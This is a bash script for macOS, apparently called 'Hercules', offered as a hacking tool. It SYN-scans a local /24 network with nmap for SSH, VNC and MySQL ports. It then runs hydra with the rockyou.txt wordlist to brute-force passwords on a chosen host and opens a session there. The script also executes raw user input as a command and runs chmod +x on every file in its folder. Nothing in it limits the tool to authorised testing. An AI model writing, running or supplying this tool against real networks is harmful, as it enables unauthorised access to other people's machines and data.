#!/bin/bash

root=0

# gets the current time in a 12-hour format
CURRENT_TIME=$(date +"%I:%M:%S %p")

# gets current date in mm/dd/yyyy format
CURRENT_DATE=$(date +"%m/%d/%Y")

if [[ "$OSTYPE" == "darwin"* ]]; then
    clear

    if [[ $EUID -ne $root ]]; then
        # Error message if not running as root
        echo "ERROR:root:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
        echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
        exit
    else
        chmod +x * 
        sudo rm -rf hydra.restore
        clear

        wget -q --spider http://google.com

        #if the user is connected to the internet it work as normal
        if [[ $? -eq 0 ]]; then
            echo
        #else it says they are not connected to the internet and will tell them to connect to it
        else
            # Error message if offline
            echo "ERROR:root:TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE." >> ERROR.LOG
            echo "TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE"
            exit
        fi

        clear

        Hercules() {
            # the logo of the program
            figlet -f slant "Hercules"
            
            echo "Type your own number to see what port you want to see"
            read -p "Do you want SSH(22), VNC(5900), MySQL(3306). To see all, type (ALL): " service
        
            if [[ $service == "ALL" || $service == "all" ]]; then
                # tells the user that it can take up to an hour to commplet the scanning process
                echo "This can take up to 1 hour to complete."
                # Scan the entire network and display open ports
                sudo nmap -sS 192.168.1.1/24 --open
                hydra -h
                echo "Put in hydra first to start the script."
                read -p ">>> " Hydra
                $Hydra
                exit
            else
                # Scan specific port
                sudo nmap -sS 192.168.1.1/24 -p $service --open
            fi
        }

        RunHackingCommand() {
            echo "To crack VNC(5900), don't type anything in the 'Input Username' function"
            echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
            read -p "Input Username: " user
            read -p "Input Hostname: " host

            if [[ $service == 5900 || $service == "VNC" ]]; then
                #checks if the user has put anything in the 'Input Username' function and the hostname funciton-
                #if not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    RunHackingCommand
                
                #if the user inputs something in the 'Input Username' function and the hostname funciton-
                #it will conitue as normal
                else
                    # Crack VNC password
                    hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                    echo "Loading VNC server..."
                    open vnc://$host
                    exit
                fi
            elif [[ $service == 22 || $service == "ssh" ]]; then
                #checks if the user has put anything in the 'Input Username' function and the hostname funciton-
                #if not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    RunHackingCommand
                #if the user inputs something in the 'Input Username' function and the hostname funciton-
                #it will conitue as normal
                else 
                    # Crack SSH password
                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                    echo "Connecting to $user@$host"
                    sleep 3
                    ssh $user@$host
                fi
            elif [[ $service == 3306 || $service == "mysql" ]]; then 
                #checks if the user has put anything in the 'Input Username' function and the hostname funciton-
                #if not, it will prompt the user to enter the username and hostname
                if [[ $user == "" && $host == "" ]]; then
                    # No service specified, re-prompt for input
                    echo "No service specified"
                    RunHackingCommand
                #if the user inputs something in the 'Input Username' function and the hostname funciton-
                #it will conitue as normal
                else
                    # Crack MySQL password
                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
                    echo "Loading to MySQL server..."
                    sleep 3
                    mysql -u $user -p -A
                fi
            
            
            fi
        }

        Hercules #calls the Hercules function
        RunHackingCommand #calls the RunHackingCommand function

    fi

else
    clear
    # Warning message for wrong OS
    echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
    echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
fi